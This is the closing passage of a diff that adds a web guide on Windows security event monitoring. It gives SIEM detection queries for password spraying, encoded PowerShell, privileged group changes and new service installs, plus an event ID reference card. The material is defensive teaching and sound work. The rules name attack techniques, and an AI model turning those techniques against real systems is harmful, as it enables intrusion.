+    &lt;Query&gt;
+        &lt;QueryList&gt;
+            &lt;Query Path="Security"&gt;
+                &lt;Select&gt;*[System[(EventID=4624 or EventID=4625 or 
+                EventID=4688 or EventID=4720 or EventID=4728)]]&lt;/Select&gt;
+            &lt;/Query&gt;
+        &lt;/QueryList&gt;
+    &lt;/Query&gt;
+&lt;/Subscription&gt;</code></pre>
+
+        <h3>SIEM Detection Rules</h3>
+
+        <pre><code># Splunk - Password Spraying Detection
+index=wineventlog EventCode=4625 
+| stats count by src_ip, user 
+| where count > 5
+
+# Splunk - Encoded PowerShell
+index=wineventlog EventCode=4688 
+| regex CommandLine="(?i)(powershell|pwsh).*(-e\s|-enc)"
+
+# Elastic - Privileged Group Modification
+event.code:(4728 OR 4732 OR 4756) AND 
+winlog.event_data.TargetUserName:"Domain Admins"
+
+# MS Sentinel - New Service Installation
+SecurityEvent
+| where EventID == 4697 or EventID == 7045
+| where ServiceFileName !contains "Windows"</code></pre>
+
+        <h2 id="quick-reference">9. Quick Reference Card</h2>
+
+        <div class="quick-ref">
+            <div class="quick-ref-card">
+                <h4 style="color: var(--accent-red);">🔐 Auth Events</h4>
+                <ul style="margin-left: 1rem;">
+                    <li><code>4624</code> - Logon Success</li>
+                    <li><code>4625</code> - Logon Failed</li>
+                    <li><code>4648</code> - Explicit Creds</li>
+                    <li><code>4672</code> - Special Privs</li>
+                </ul>
+            </div>
+            <div class="quick-ref-card">
+                <h4 style="color: var(--accent-orange);">👤 Account Events</h4>
+                <ul style="margin-left: 1rem;">
+                    <li><code>4720</code> - User Created</li>
+                    <li><code>4724</code> - Password Reset</li>
+                    <li><code>4728</code> - Group Member Add</li>
+                    <li><code>4732</code> - Local Group Add</li>
+                </ul>
+            </div>
+            <div class="quick-ref-card">
+                <h4 style="color: var(--accent-green);">⚙️ Process Events</h4>
+                <ul style="margin-left: 1rem;">
+                    <li><code>4688</code> - Process Created</li>
+                    <li><code>4697</code> - Service Installed</li>
+                    <li><code>4698</code> - Task Created</li>
+                    <li><code>1</code> - Sysmon Process</li>
+                </ul>
+            </div>
+            <div class="quick-ref-card">
+                <h4 style="color: var(--accent-blue);">📜 PowerShell</h4>
+                <ul style="margin-left: 1rem;">
+                    <li><code>4103</code> - Module Logging</li>
+                    <li><code>4104</code> - Script Block</li>
+                    <li><code>400</code> - Engine Start</li>
+                    <li><code>800</code> - Pipeline Exec</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="success-box">
+            <strong>✅ Next Steps:</strong>
+            <ul style="margin-top: 1rem;">
+                <li>Install <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
+                        style="color: var(--accent-cyan);">Sysmon</a> for enhanced process monitoring</li>
+                <li>Configure Windows Event Forwarding for centralized logging</li>
+                <li>Build detection rules in your SIEM for the patterns above</li>
+                <li>Practice with <a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES"
+                        style="color: var(--accent-cyan);">EVTX Attack Samples</a></li>
+            </ul>
+        </div>
+
+        <div class="info-box">
+            <strong>🔗 Related Resources:</strong>
+            <ul style="margin-top: 1rem;">
+                <li><a href="/guides/active-directory-security-hardening.html" style="color: var(--accent-cyan);">Active
+                        Directory Security & Hardening</a></li>
+                <li><a href="/guides/siem-log-analysis.html" style="color: var(--accent-cyan);">SIEM Log Analysis for
+                        Beginners</a></li>
+                <li><a href="/guides/threat-hunting-techniques.html" style="color: var(--accent-cyan);">Threat Hunting
+                        Techniques</a></li>
+                <li><a href="/guides/incident-response-automation.html" style="color: var(--accent-cyan);">Incident
+                        Response Automation</a></li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border); color: var(--text-muted);">
+            <strong>Author:</strong> TheHGTech Security Team<br>
+            <strong>Last Updated:</strong> December 2025<br>
+            <strong>Reading Time:</strong> 22 minutes
+        </p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const body = document.body;
+            if (localStorage.getItem('theme') === 'light') {
+                body.classList.add('light-mode');
+            }
+        });
+    </script>
+</body>
+
+</html>
